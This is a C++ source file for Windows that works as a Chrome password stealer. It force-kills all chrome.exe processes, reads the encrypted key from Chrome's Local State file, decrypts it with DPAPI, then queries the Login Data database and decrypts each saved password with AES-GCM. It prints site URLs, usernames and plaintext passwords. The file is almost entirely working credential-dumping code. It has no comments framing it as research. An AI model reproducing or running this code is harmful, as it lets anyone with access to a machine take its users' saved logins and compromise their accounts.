#include "browser.hxx"
#include "crypto.hxx"
#include "nowide.hxx"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <tlhelp32.h>
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <bcrypt.h>
#include <wil/resource.h>

namespace {
void hexdump(const uint8_t *addr, size_t len, const char *desc = NULL);
void kill_chrome();
}

//using unique_sqlite_conn = wil::unique_struct<sqlite3, decltype(&sqlite3_close), sqlite3_close>;
//using unique_sqlite_stmt = wil::unique_struct<sqlite3_stmt, decltype(&sqlite3_finalize), sqlite3_finalize>;

int main() {
    wil::unique_bcrypt_algorithm bc_alg;
    if (STATUS_SUCCESS != BCryptOpenAlgorithmProvider(&bc_alg, BCRYPT_AES_ALGORITHM, NULL, 0)) {
        std::wcerr << L"error opening a bcrypt algorithm provider\n";
        return 1;
    }

    BCryptSetProperty(bc_alg.get(), BCRYPT_CHAINING_MODE, (BYTE *)BCRYPT_CHAIN_MODE_GCM, sizeof (BCRYPT_CHAIN_MODE_GCM), 0);

    std::wcout << "key path: "     << chrome::key_path << "\n"
               << "logins path: "  << chrome::logins_path << "\n"
               << "cookies path: " << chrome::cookies_path << "\n";

    kill_chrome();

    std::ifstream key_file(chrome::key_path);

    using json = nlohmann::json;
    std::vector<uint8_t> key_data;
    try {
        json j = json::parse(key_file);
        std::string key_string = j["os_crypt"]["encrypted_key"];
        std::cout << "raw key: " << key_string << "\n";
        key_data = base64_decode(&key_string[0]);
    } catch (json::exception &) {
        std::wcerr << L"error reading json\n";
        return 1;
    }
    hexdump(&key_data[0], key_data.size(), "base64 decoded key");

    key_data.erase(key_data.begin(), key_data.begin() + 5); // TODO vector isn't a good container for this operation
    key_data = dpapi_decrypt(key_data);
    hexdump(&key_data[0], key_data.size(), "DPAPI decrypted key");

    wil::unique_bcrypt_key bc_key = bcrypt_import_key_blob(bc_alg, key_data);
    if (!bc_key) {
        std::wcerr << L"error importing key\n";
        return 1;
    }

    sqlite3 *db;
    if (sqlite3_open(narrow(chrome::logins_path).c_str(), &db) != SQLITE_OK) {
        std::wcerr << L"couldn't open db. is chrome installed?\n";
        return 1;
    }

    sqlite3_stmt *statement;
    // https://source.chromium.org/chromium/chromium/src/+/main:components/password_manager/core/browser/login_database.cc;drc=4019e81d73554328448bd06db3eeb653080a3fb1;l=312
    if (sqlite3_prepare_v2(db, "SELECT action_url, date_created, username_value, password_value FROM logins", -1, &statement, NULL) != SQLITE_OK) {
        std::wcerr << L"error compiling sql statement\n";
        sqlite3_close(db);
        return 1;
    }

    int sql_ret = 0;
    while ((sql_ret = sqlite3_step(statement)) == SQLITE_ROW) {
        const uint8_t *pw_col = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(statement, 3));
        const size_t pw_col_size = sqlite3_column_bytes(statement, 3);

        std::cout << "action_url: "   << sqlite3_column_text(statement, 0) << "\n"
                  << "date created: " << chrome::format_time(sqlite3_column_int64(statement, 1)) << "\n"
                  << "username: "     << sqlite3_column_text(statement, 2) << "\n";

        // [0, 2]  - magic bytes
        // [3, 14] - nonce
        // [15, n] - ciphertext
        std::vector<uint8_t> nonce(pw_col + 3, pw_col + 15),
                             ciphertext(pw_col + 15, pw_col + pw_col_size);

        NTSTATUS status_ret;
        ULONG bytes_copied;

        BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
        status_ret = BCryptGetProperty(bc_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (BYTE *)&auth_tag_lengths, sizeof (auth_tag_lengths), &bytes_copied, 0);

        std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
        BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
        auth_info.pbNonce = &nonce[0];
        auth_info.cbNonce = (ULONG)nonce.size();
        auth_info.pbTag   = &auth_tag[0];
        auth_info.cbTag   = (ULONG)auth_tag.size();

        std::vector<uint8_t> plaintext(ciphertext.size());

        status_ret = BCryptDecrypt(bc_key.get(),
                                   &ciphertext[0],
                                   ciphertext.size(),
                                   &auth_info,
                                   NULL, 0,
                                   &plaintext[0], plaintext.size(),
                                   &bytes_copied,
                                   0);

        plaintext.resize(plaintext.size() - 16); // TODO
        std::cout << "plaintext password: ";
        for (char c : plaintext) {
            std::cout << c;
        }
        std::cout << "\n\n";
    }
    if (sql_ret != SQLITE_DONE) {
        std::wcerr << L"error performing sql query: " << widen(sqlite3_errmsg(db)) << L"\n";
        std::wcerr << L"ret: " << sql_ret << L"\n";
    }

    sqlite3_finalize(statement);
    sqlite3_close(db);
}

namespace {
void hexdump(const uint8_t *addr, size_t len, const char *desc) {
    if (desc) {
        printf("%s:\n", desc);
    }

    const short bytes_per_line = 16;

    char ascii_representation[bytes_per_line] = {0};

    int i;
    for (i = 0; i < len; ++i) {
        if ((i % bytes_per_line) == 0) {
            printf("%08X |", i);
        }

        printf(" %02X", addr[i]);

        if (isprint(addr[i])) {
            ascii_representation[i % bytes_per_line] = addr[i];
        } else {
            ascii_representation[i % bytes_per_line] = '.';
        }

        if ((i % bytes_per_line) == bytes_per_line - 1) {
            // ascii_representation is not null terminated so print exactly bytes_per_line characters
            printf(" | %.*s\n", bytes_per_line, ascii_representation);
        }
    }

    if (i % 16 != 0) {
        // pad last line if not a full 16 bytes
        for (int j = i; j % bytes_per_line != 0; ++j) {
            printf("   ");
        }

        printf(" | %.*s\n", i % bytes_per_line, ascii_representation);
    }
}

void kill_chrome() {
    PROCESSENTRY32W process_entry;
    process_entry.dwSize = sizeof (PROCESSENTRY32W);

    wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));
    if (Process32FirstW(snapshot.get(), &process_entry) == TRUE) {
        do {
            if (narrow(process_entry.szExeFile) == "chrome.exe") {
                wil::unique_handle process(OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry.th32ProcessID));
                if (process) {
                    TerminateProcess(process.get(), 0);
                }
            }
        } while (Process32NextW(snapshot.get(), &process_entry));
    }
}
}